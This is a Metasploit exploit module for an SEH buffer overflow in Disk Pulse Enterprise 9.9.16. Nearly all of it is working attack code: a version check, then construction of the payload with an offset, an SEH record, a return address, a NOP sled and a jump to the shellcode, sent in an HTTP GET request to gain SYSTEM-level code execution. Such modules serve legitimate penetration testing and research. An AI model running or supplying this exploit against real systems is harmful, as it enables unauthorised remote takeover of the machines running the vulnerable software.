# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Seh
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Disk Pulse Enterprise GET Buffer Overflow&#039;,
      &#039;Description&#039;    => %q(
        This module exploits an SEH buffer overflow in Disk Pulse Enterprise
        9.9.16. If a malicious user sends a crafted HTTP GET request
        it is possible to execute a payload that would run under the Windows
        NT AUTHORITY\SYSTEM account.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Chance Johnson&#039;, # msf module - albatross@loftwing.net
          &#039;Nipun Jaswal & Anurag Srivastava&#039; # Original discovery -- www.pyramidcyber.com
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;42560&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;EncoderType&#039; => "alpha_mixed",
          &#039;BadChars&#039; => "\x00\x0a\x0d\x26"
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Disk Pulse Enterprise 9.9.16&#039;,
            {
              &#039;Ret&#039; => 0x1013ADDD, # POP EDI POP ESI RET 04 -- libpal.dll
              &#039;Offset&#039; => 2492
            }]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Aug 25 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options([Opt::RPORT(80)])
  end
 
  def check
    res = send_request_cgi(
      &#039;uri&#039;    =>  &#039;/&#039;,
      &#039;method&#039; =>  &#039;GET&#039;
    )
 
    if res && res.code == 200 && res.body =~ /Disk Pulse Enterprise v9\.9\.16/
      return Exploit::CheckCode::Appears
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    connect
 
    print_status("Generating exploit...")
    exp = payload.encoded
    exp << &#039;A&#039; * (target[&#039;Offset&#039;] - payload.encoded.length) # buffer of trash until we get to offset
    exp << generate_seh_record(target.ret)
    exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
    exp << "\xE9\x25\xBF\xFF\xFF" # jmp 0xffffbf2a - jmp back to shellcode start
    exp << &#039;B&#039; * (5000 - exp.length) # padding
 
    print_status("Sending exploit...")
 
    send_request_cgi(
      &#039;uri&#039; =>  &#039;/../&#039; + exp,
      &#039;method&#039; =>  &#039;GET&#039;,
      &#039;host&#039; =>  &#039;4.2.2.2&#039;,
      &#039;connection&#039; =>  &#039;keep-alive&#039;
    )
 
    handler
    disconnect
  end
end

